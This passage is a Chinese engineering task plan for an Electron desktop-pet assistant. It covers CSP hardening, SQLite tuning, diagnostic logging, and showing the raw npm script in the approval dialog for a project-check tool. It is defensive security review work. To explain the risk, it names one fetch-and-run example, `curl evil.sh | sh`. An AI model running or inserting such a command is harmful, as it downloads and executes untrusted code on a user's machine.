- 不要删 `assets/models/local/kaltsit-work/`（`.gitignore` 白名单里明确保留了它）
- 不要动 `ATTRIBUTION.md` 与各类 LICENSE 文件

---

## T9 · 补齐 CSP，移除生产包里的 dev server 地址

**优先级** P2 · **预估** 1 小时 · **风险** 低
**影响文件** `src/renderer/index.html`、`vite.config.mts`

### 现状

`src/renderer/index.html:8` 的 CSP 已经很紧（`script-src 'self'`，没有 `unsafe-inline`）：

```
default-src 'self'; script-src 'self'; style-src 'self';
img-src 'self' data: blob: deskpet-model:;
connect-src 'self' deskpet-model: ws://127.0.0.1:5173
```

### 问题

1. **`base-uri` 和 `form-action` 不会回退到 `default-src`**，目前完全未限制
2. `connect-src` 里的 `ws://127.0.0.1:5173` 是 Vite HMR 用的，**会原样进生产包**

### 改法

补上缺失的指令：

```
default-src 'self'; script-src 'self'; style-src 'self';
img-src 'self' data: blob: deskpet-model:;
connect-src 'self' deskpet-model:;
base-uri 'none'; form-action 'none'; object-src 'none'; frame-src 'none'
```

dev server 地址用 Vite 的 `transformIndexHtml` 钩子或 `%VITE_XXX%` 占位符按环境注入，
生产构建时不出现。

### 验收标准

- [ ] 生产构建产物的 CSP 中没有 `ws://127.0.0.1:5173`
- [ ] 开发模式下 HMR 仍然正常工作
- [ ] 应用功能全部正常，DevTools Console 没有新的 CSP 违规报错
- [ ] 特别验证：Live2D 模型通过 `deskpet-model:` 协议加载正常、
      TTS 音频播放正常（走 WebAudio `decodeAudioData`，不受 `media-src` 限制）

### 不要做

- 不要添加 `unsafe-inline` 或 `unsafe-eval`
- 不要放宽 `script-src`

---

## T10 · 数据库裁剪节流 + busy_timeout

**优先级** P2 · **预估** 1 小时 · **风险** 低
**影响文件** `src/main/storage/deskpet-database.ts`

### 问题 A：每插入一条消息就跑一次全表裁剪

`appendMessage()`（第 105 行）每次 `INSERT` 之后都紧跟：

```sql
DELETE FROM messages
 WHERE conversation_id = ?
   AND rowid NOT IN (
     SELECT rowid FROM messages
      WHERE conversation_id = ?
      ORDER BY created_at DESC, rowid DESC
      LIMIT ?
   )
```

这个子查询要排序 2000 行才能确定保留集，而 99.9% 的情况下一条都删不掉。

**改法**：先 `SELECT COUNT(*)`（有 `messages_conversation_created` 索引，很快），
超过 `MAX_STORED_MESSAGES + 100` 才执行裁剪。

### 问题 B：缺 busy_timeout

第 65 行的初始化是：

```ts
this.connection.exec(
  'PRAGMA foreign_keys = ON; PRAGMA journal_mode = WAL; PRAGMA synchronous = NORMAL;',
);
```

WAL 模式下遇到锁会**直接抛错而不是等待**。加上 `PRAGMA busy_timeout = 5000;`。

### 验收标准

- [ ] 连续插入 100 条消息时，裁剪 SQL 的执行次数显著减少（可用计数器验证）
- [ ] 消息数超过 `MAX_STORED_MESSAGES` 时裁剪行为与改动前一致
- [ ] `tests/conversation-storage.test.ts` 通过
- [ ] 新增测试：插入 2100 条后剩余恰好 2000 条

### 不要做

- 不要改 `MAX_STORED_MESSAGES` 的值
- 不要把 `synchronous` 降到 `OFF`

---

## T11 · 项目检查审批弹窗展示脚本原文

**优先级** P2 · **预估** 1 小时 · **风险** 低
**影响文件** `src/main/assistant/project-check-runner.ts`、`src/main/assistant/assistant-tool-service.ts`、
`src/shared/assistant-tools-ipc.ts`、渲染层审批 UI

### 问题

`run_project_check` 最终执行的是工作区 `package.json` 里的 `scripts.test` ——
**那是一段任意 shell 命令**。

`project-check-runner.ts` 第 110 行附近已经读到了脚本内容：

```ts
const script = check in scripts ? (scripts as Record<string, unknown>)[check] : undefined;
if (typeof script !== 'string' || !script.trim()) {
  throw new Error(`package.json 没有 ${check} 脚本。`);
}
```

但它**只用来判断存在与否，然后就丢掉了**。

用户在审批框里看到的是（`assistant-tool-service.ts:592`）：

> 将运行 package.json 中的 test 脚本。项目脚本会执行工作区代码。

用户**无法区分 `vitest run` 和 `curl evil.sh | sh`**。
环境变量白名单、超时、`shell: false` 都拦不住 npm script 本身。

### 改法

让 runner 暴露一个"只读取脚本原文、不执行"的方法，
`assistant-tool-service.ts` 在弹审批之前调用它，把脚本原文（截断到 200 字符）
放进审批 payload，渲染层用等宽字体展示：

> 将在 `<workspaceRoot>` 执行：
> `vitest run --reporter=dot`
> 项目脚本会执行工作区代码。

`shared/assistant-tools-ipc.ts` 中的审批数据结构需要相应扩展并加校验
（长度上限、类型检查）。

### 验收标准

- [ ] 审批弹窗显示真实的脚本原文
- [ ] 脚本原文超过 200 字符时截断并标明
- [ ] 脚本原文中的特殊字符**以 textContent 写入，不得走任何 HTML 拼接**
- [ ] 读取脚本原文的路径复用现有的 `realpath` + `lstat` + 体积上限校验
- [ ] 用户拒绝时不执行任何命令
- [ ] `tests/project-check-runner.test.ts`、`tests/assistant-tool-service.test.ts` 更新并通过

### 更彻底的做法（可选，需先与作者确认）

绕开 npm script，直接探测并执行 `node_modules/.bin/vitest` 这类固定二进制。
**本任务默认不做**，因为会改变功能语义。

### 不要做

- 不要扩大 `run_project_check` 的能力范围（比如允许任意 script 名）
- 不要移除现有的审批环节

---

## T12 · 修正 create-main-window 的声明顺序

**优先级** P3 · **预估** 10 分钟 · **风险** 极低
**影响文件** `src/main/windows/create-main-window.ts`

### 问题

第 76 行的 `isTrustedMicrophoneRequest` 引用了 `devServerUrl`，
而 `const devServerUrl = process.env.VITE_DEV_SERVER_URL;` 在**第 89 行**才声明。

运行时不会出错（函数只在权限回调里被调用，那时已过 TDZ），
但读起来像 bug，也让人怀疑麦克风权限判断的正确性。

### 改法

把 `const devServerUrl = ...` 提到 `isTrustedMicrophoneRequest` 定义之前。
纯移动，不改逻辑。

### 验收标准

- [ ] `tests/window-microphone-permission.test.ts` 通过
- [ ] 开发模式与打包模式下麦克风权限行为均未改变

---

## T13 · 给降级路径的静默 catch 接上诊断日志

**优先级** P3 · **预估** 半天 · **风险** 低
**影响文件** 全仓库（有选择地）

### 现状

`catch {}` / `catch { /* ignore */ }` 在 `src/` 中出现 **132 次**。

大部分是刻意的降级设计，符合 AGENTS.md 第 7 条，**这没问题**。
但其中一部分吞掉的是真正的配置错误，用户只会看到"功能不可用"而拿不到任何线索。

### 改法

项目已有 `SafeDiagnosticLog`（`src/main/diagnostics/safe-diagnostic-log.ts`，会脱敏）。

给**降级路径上的** catch 统一加一行：

```ts
} catch {
  diagnostics.record('speech-runtime-start-failed');
}
```

设置页加一个"诊断日志"入口，让用户能自己看到发生了什么。

**保持原样的 catch**（不要动）：
- `close().catch(() => undefined)` 这类清理操作
- 解析可选字段失败后有明确默认值的
- preload 中忽略畸形事件的（那是防御性设计）

### 验收标准

- [ ] 语音、VTube Studio、ViewerEx、桌面集成、记忆索引这五个子系统的
      启动/配置失败路径都有诊断记录
- [ ] 诊断日志中**不出现**任何密钥、token、完整文件路径中的用户名、对话内容
- [ ] `tests/safe-diagnostic-log.test.ts` 通过
- [ ] 子系统失败时文字聊天仍然可用（G5）

### 不要做

- 不要给全部 132 处都加日志——那会产生噪音
- 不要用 `console.log` 代替 `SafeDiagnosticLog`

---

## T14 · 探测 node:sqlite 的 backup 可用性

**优先级** P3 · **预估** 1 小时 · **风险** 低
**影响文件** `src/main/storage/deskpet-database.ts`

### 问题

`deskpet-database.ts:4`：

```ts
import { DatabaseSync, backup } from 'node:sqlite';
```

`backup()` 比 `DatabaseSync` 晚几个 Node 版本才加入。
`package.json` 声明 `engines.node >= 24`，但**真正决定运行时的是 Electron 43 内置的 Node 版本，
不是开发机上的 Node**。

### 改法

启动时探测一次：

```ts
const backupSupported = typeof backup === 'function';
```

不支持时，依赖 backup 的功能（数据库导出/备份）安全降级并给出可读提示，
而不是在用户点按钮时抛出难以理解的错误。

同时在 CI 里加一个 **Electron 环境下**的冒烟测试
（现有测试跑在 `environment: 'node'`，验证不了这个）。

### 验收标准

- [ ] 明确记录 Electron 43 实际内置的 Node 版本
- [ ] `backup` 不可用时功能安全降级，不崩溃
- [ ] CI 中有一个在 Electron 里跑的冒烟测试

---

## 附录 A · 暂不处理的事项（已评估，有意排除）

| 事项 | 为什么不做 |
|---|---|
| **ONNX 模型 int8 量化** | 拿听感换体积，音质优先。上游（`tsukumijima` / Style-Bert-VITS2）都没做过 int8，验证成本与风险全部自担。三个模型原样保留 |
| **改用 NSIS / MSI 安装器** | 未签名 exe 会触发 SmartScreen 警告，比 zip 更劝退；代码签名证书是额外成本。zip 免安装继续 |
| **换掉 ASR 模型** | sherpa-onnx 的 paraformer-zh int8 是 227 MB、三语版 234 MB，与现在的 SenseVoice int8（239 MB）同量级，换了没有体积收益 |
| **TTS 侧也去掉 Python** | 难点不在推理（onnxruntime 是同一个 C++ 库，速度一样），在于日语前端：pyopenjtalk 的 G2P、韵律标注、BERT tokenizer 要重新实现，出错表现是"读音怪但不报错"，最难调。现成的 Rust 方案 `sbv2-api` 目前是 alpha 且 C API 还在 TODO。**观望，等它出稳定版** |
| **Electron 换 Qt/C++ 或 Tauri** | Qt 是从零重来（Live2D 要换 Cubism Native SDK，Motion / Expression / 物理 / 渲染管线自己写）；Tauri 也要用 Rust 重写整个 main 层（17 个子目录、1066 行 IPC 注册、SQLite、safeStorage、uiohook、VTS WebSocket）。省下的约 320 MB 在 896 MB 模型面前不显眼，而**106 个测试文件会全部作废** |
| **合并两套 Python 运行时** | T2 完成后只剩 TTS 一套，没有"两套"可合并。已被 T2 吸收 |

---

## 附录 B · 审查中确认没有问题的部分（不要"顺手优化"）

这些是已经做对的地方，改动它们只会引入风险：

- **Electron 安全配置**：`contextIsolation: true` / `sandbox: true` /
  `nodeIntegration: false`，加上 `setWindowOpenHandler` 拒绝、`will-navigate` 阻止、
  `will-attach-webview` 阻止 —— 四道锁全上了
- **麦克风权限收窄**：只有主窗口、只有 `media`、只有单一 `audio` 类型、
  只有 `file:` 或 dev server 源才放行。这个粒度很少见，不要放宽
- **preload 白名单**：没有 `ipcRenderer.invoke` 透传，每个 Main→Renderer 事件都过
  `parseXxxEvent` 校验
- **渲染层零 `innerHTML`**：全部走 `createElement` + `textContent`，XSS 面几乎为零。
  **不要为了方便而引入任何 HTML 字符串拼接**
- **网络适配器的双重取消**：所有 LLM / 语音适配器都做了
  `AbortSignal.any([外部信号, AbortSignal.timeout()])`，这是很多项目会漏的
- **`project-check-runner` 的子进程隔离**：env 白名单只放行 12 个变量并强制 `CI=1`，
  `shell: false`，有 timeout 和 maxBuffer
- **命名空间隔离**：每个角色的人设、记忆、术语表、知识都带 `memoryNamespace`，
  数据库查询全部按它过滤
- **106 个测试文件**：这是本项目最值钱的资产。任何改动都不得净减少测试覆盖

---

## 附录 C · 每个任务完成后的验证

```bash
# 最小验证（单个任务）
pnpm test

# 跨边界改动（T2 / T5 / T6 必须跑）
pnpm verify
# = lint + format:check + typecheck + test + build + smoke:preload

# 打包验证（T2 / T3 / T6 / T8 必须跑）
pnpm package:win
```

改动涉及打包配置时，**必须实际打包并运行产物**，不能只看构建是否成功。

---

## 附录 D · 关键数据速查

| 项目 | 数值 | 来源 |
|---|---|---|
| `src/` TypeScript 文件数 | 154 | 目录遍历 |
| `chat-controller.ts` 行数 | 5814（单函数 5560） | `wc -l` |
| `register-ipc-handlers.ts` handler 数 | 85（守卫覆盖 85/85） | 逐个核对 |
| 测试文件数 | 106 | `tests/` |
| 日语 BERT（fp16） | 408 MB | `release/speech-slim-prototype/` |
| TTS 声学模型（fp32） | 249 MB | 同上 |
| SenseVoice ASR（int8） | 239 MB | 同上 |
| 模型合计 | 896 MB | — |
| v1.7 语音包（zip） | 704.7 MB | `release/v1.7-artifacts/` |
| v1.7 主包（zip） | 159.8 MB | 同上 |
| v1.7 合并包（zip） | 1,992.8 MB | 仓库根目录 |
| v1.6 发布包（对照） | 234.5 MB | `release/` |
| `凯尔希直播版1.cmo3` | 8.09 MB | `assets/models/local/` |

体积均为实测；分档下载的压缩后体积为估算，需实际打包确认。
